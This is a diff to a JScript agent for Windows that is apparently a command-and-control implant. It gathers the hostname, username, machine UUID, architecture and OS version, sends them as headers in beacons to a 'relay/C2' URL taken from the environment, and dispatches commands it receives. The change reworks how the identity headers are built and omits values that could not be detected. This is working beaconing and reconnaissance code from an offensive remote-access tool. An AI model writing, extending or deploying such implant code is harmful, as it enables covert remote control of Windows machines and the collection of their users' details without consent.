@@ -161,7 +161,9 @@ function runAgent() {
         var archMap = { AMD64: 'x86_64', x86: 'i386', ARM64: 'aarch64' };
         var archFromEnv = readEnv('PROCESSOR_ARCHITEW6432');
         if (!archFromEnv) archFromEnv = readEnv('PROCESSOR_ARCHITECTURE');
-        var arch = archMap[archFromEnv] || archFromEnv || 'unknown';
+        // Undetected values stay '' — the header is OMITTED below, never sent empty and
+        // never as a placeholder like 'unknown' (the relay/C2 read that as "not reported").
+        var arch = archMap[archFromEnv] || archFromEnv;
         var processArch = archMap[readEnv('PROCESSOR_ARCHITECTURE')] || '';
         var osVersion = '', buildNumber = '', cpuArchCode = '';
         try {
@@ -175,21 +177,29 @@ function runAgent() {
         var versionMatch = /^(\d+)\.(\d+)/.exec(osVersion);
         if (versionMatch) { if (versionMatch[1] == '6' && versionMatch[2] == '1') clrVersion = 'v2.0.50727'; }
         else if (buildNumber == '7600' || buildNumber == '7601') clrVersion = 'v2.0.50727';
-        return [
+        // REQUIRED headers carry compile-time constants. Every detection-derived field is
+        // OPTIONAL: a value that could not be detected OMITS the header so the relay/C2
+        // see "not reported" instead of an empty string or a fabricated default. The
+        // machine UUID is nullable too — when every fallback fails it is omitted and the
+        // relay treats the agent as identity-less (beacons answered with held 200s, no
+        // session, no commands). There is NO Bitness header: the process arch already
+        // carries the full width, and x86_64/aarch64 are both 64-bit — a bare bit flag
+        // would say nothing about which.
+        var headers = [
             ['X-Agent-Api-Version', '1'],
-            ['X-Agent-Uuid', guid],
-            ['X-Agent-Hostname', readEnv('COMPUTERNAME')],
-            ['X-Agent-Username', readEnv('USERNAME')],
-            ['X-Agent-Arch', arch],
-            ['X-Agent-Process-Arch', processArch],
             ['X-Agent-Platform', 'Windows'],
-            ['X-Agent-Os-Version', osVersion],
-            ['X-Agent-Build', buildNumber],
-            ['X-Agent-Commit', ''],
             ['X-Agent-Name-Id', '1'],
-            ['X-Agent-Bitness', (processArch == 'x86_64' || processArch == 'aarch64') ? '64' : '32'],
             ['X-Agent-Capabilities', '0800000000000000']
         ];
+        function addHeader(name, value) { if (value) headers.push([name, '' + value]); }
+        addHeader('X-Agent-Machine-Uuid', guid);
+        addHeader('X-Agent-Hostname', readEnv('COMPUTERNAME'));
+        addHeader('X-Agent-Username', readEnv('USERNAME'));
+        addHeader('X-Agent-Arch', arch);
+        addHeader('X-Agent-Process-Arch', processArch);
+        addHeader('X-Agent-Os-Version', osVersion);
+        addHeader('X-Agent-Build', buildNumber);
+        return headers;
     }
     function dispatchCommand(bytes) {
         function base64Length(base64) {
@@ -255,7 +265,10 @@ function runAgent() {
     var beaconUrl = readEnv('H_URL');
     if (!beaconUrl) { log('beacon endpoint not set'); return 'fail'; }
     identityHeaders = buildIdentity();
-    log('JScript agent beaconing to ' + beaconUrl + ' as ' + identityHeaders[1][1]);
+    var uuidForLog = '';
+    for (var u = 0; u < identityHeaders.length; u++)
+        if (identityHeaders[u][0] == 'X-Agent-Machine-Uuid') uuidForLog = identityHeaders[u][1];
+    log('JScript agent beaconing to ' + beaconUrl + ' as ' + (uuidForLog || 'an unidentified machine'));
     var pendingReplies = [];
     while (!exiting) {
         var xhr = null;
